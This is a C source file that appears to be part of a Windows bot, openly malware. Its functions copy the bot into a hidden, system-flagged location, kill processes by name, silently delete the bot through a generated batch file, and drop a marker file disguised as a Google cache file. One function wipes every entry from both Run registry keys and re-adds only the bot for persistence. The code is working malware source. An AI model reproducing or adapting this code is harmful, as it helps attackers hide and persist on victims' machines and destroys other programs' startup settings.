#include "includes.h"
#include "externs.h"

BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	PathRemoveFileSpec(CurrentPath);
	char buf3[260],windir[260];

	GetTempPath(sizeof(windir),windir); //Did get windows directory
	GetModuleFileName(NULL,buf3,MAX_PATH);


	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF, FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
			else
				break;
		}

		//SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
		{

			return TRUE;
		}

	}
	else
	{

	}
	return FALSE;
}

int killproc(char* exename) // Kill process by name
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle     = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;
	char execute[256];
	_snprintf(execute, sizeof(execute),"taskkill /IM %s",exename);
	CreateProcess(NULL, execute, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	return 1;
}


////////////////////////////////////////////////////////////////

void uninstall(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cpbot[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cpbot,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"ping 1.1.1.1 -w 5000 >nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		ShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
		WSACleanup();
		ExitProcess(0);
	}
	
	return;
}


//Registry killer
HKEY hk;
HKEY hk2;
HKEY hndKey;
char BOT_DIR[40];
char cpbot[MAX_PATH];
char movetopath[MAX_PATH];
char spath[MAX_PATH];

void registryKiller() 
	{
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);
	wsprintf(BOT_DIR, "%s",spath);
	
					RegDeleteKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk);//HKLM Clear. -- JynX
					RegCloseKey(hk);
					
					RegDeleteKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
					RegCreateKey(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk2);//HCKU Clear. -- JynX
					RegCloseKey(hk2);
					
					RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
					RegSetValueEx(hndKey,szRegname,0, REG_SZ, (const unsigned char *)BOT_DIR, strlen(BOT_DIR));
					RegCloseKey(hndKey);//HKLM Re-add. -- JynX
					
					RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
					RegSetValueEx(hndKey,szRegname,0, REG_SZ, (const unsigned char *)BOT_DIR, strlen(BOT_DIR));
					RegCloseKey(hndKey);//HKCU Re-add. -- JynX
					
				  RegCloseKey(hndKey);//Was causing a memory leak... -fixed --JynX
	}
	
	HANDLE GetProcessHandle(LPSTR szExeName)
{
  PROCESSENTRY32 Pc = { sizeof(PROCESSENTRY32) };
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  if(Process32First(hSnapshot, &Pc)){
    do{
      if(!strcmp(Pc.szExeFile, szExeName)) {
        return OpenProcess(PROCESS_ALL_ACCESS, TRUE, Pc.th32ProcessID);
      }
    }while(Process32Next(hSnapshot, &Pc));
  }
  return NULL;
}
	
	
	//Is the bot new?
bool IsNew()
{
	char tmppath[MAX_PATH];
	ExpandEnvironmentStrings(gotopth,tmppath,sizeof(tmppath));
	char* str = "";
	wsprintf(str, "\\google_cache%s.tmp",installrand);
	strcat(tmppath,str);
	DWORD dwAttributes = GetFileAttributes(tmppath);
	if(dwAttributes == 0xffffffff)
	{
		FILE* hFile = fopen(tmppath, "wb");
		if(hFile)
		{
			fprintf(hFile,"website=1");
			fclose(hFile);
				return TRUE;
		}
	}
	return FALSE;

}
